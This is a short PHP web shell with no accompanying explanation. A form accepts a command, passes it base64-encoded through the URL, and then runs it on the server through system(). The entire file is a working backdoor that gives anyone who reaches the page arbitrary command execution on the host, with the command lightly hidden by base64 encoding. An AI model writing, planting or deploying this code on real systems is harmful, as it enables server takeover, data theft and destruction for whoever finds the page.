<?php
if(isset($_POST['cmd'])){
	header('Location: ./?cmd='.base64_encode($_POST['cmd']));
}
else if(isset($_GET['cmd'])){
	system(base64_decode($_GET['cmd']));
}
?>
<form method="POST">
Cmd : <input type="text" name="cmd"><br />
<input type="submit">
</form>
